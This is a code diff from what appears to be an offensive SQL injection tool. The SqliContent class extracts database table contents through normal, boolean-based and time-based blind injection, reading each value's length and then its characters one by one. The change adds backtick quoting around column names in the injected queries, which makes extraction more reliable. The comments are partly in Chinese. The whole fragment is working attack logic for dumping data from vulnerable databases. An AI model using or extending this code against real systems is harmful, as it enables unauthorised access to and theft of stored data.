@@ -109,7 +109,7 @@ class SqliContent(SqliColumns):
             # 注这一条的数据长度
             logger.debug("Start %dth content length sqli..." % (limits + 1))
 
-            content_len = normal_injection(select="length(" + column_name + ")",
+            content_len = normal_injection(select="length(`" + column_name + "`)",
                                            source=database_name + "." + table_name,
                                            limit=limits,
                                            dealpayload=self.dealpayload,
@@ -123,7 +123,7 @@ class SqliContent(SqliColumns):
             # 然后注content
             logger.debug("Start %dth content sqli..." % (limits + 1))
 
-            content = normal_injection(select=column_name,
+            content = normal_injection(select="`" + column_name + "`",
                                        source=database_name + "." + table_name,
                                        limit=limits,
                                        dealpayload=self.dealpayload,
@@ -143,7 +143,7 @@ class SqliContent(SqliColumns):
 
             # 然后注content 的 length
 
-            retVal = build_injection(select="length(" + column_name + ")",
+            retVal = build_injection(select="length(`" + column_name + "`)",
                                      source=database_name + "." + table_name,
                                      limit=limits,
                                      dealpayload=self.dealpayload, data=self.Data,
@@ -160,7 +160,7 @@ class SqliContent(SqliColumns):
             logger.debug("Start %dth content sqli..." % (limits + 1))
 
             for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False):
-                retVal = build_injection(select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
+                retVal = build_injection(select="ascii(substring(`" + column_name + "`," + repr(j + 1) + ",1))",
                                          source=database_name + "." + table_name,
                                          limit=limits,
                                          dealpayload=self.dealpayload, data=self.Data, lens=self.len,
@@ -180,7 +180,7 @@ class SqliContent(SqliColumns):
 
             # 然后注content 的length
 
-            retVal = time_injection(select="length(" + column_name + ")",
+            retVal = time_injection(select="length(`" + column_name + "`)",
                                     source=database_name + "." + table_name,
                                     limit=limits,
                                     dealpayload=self.dealpayload, data=self.Data, times=self.time,
@@ -196,7 +196,7 @@ class SqliContent(SqliColumns):
             logger.debug("Start %dth content sqli..." % (limits + 1))
 
             for j in trange(int(content_len), desc='%dth Database sqli' % (limits + 1), leave=False):
-                retVal = time_injection(select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
+                retVal = time_injection(select="ascii(substring(`" + column_name + "`," + repr(j + 1) + ",1))",
                                         source=database_name + "." + table_name,
                                         limit=limits,
                                         dealpayload=self.dealpayload, data=self.Data, times=self.time,
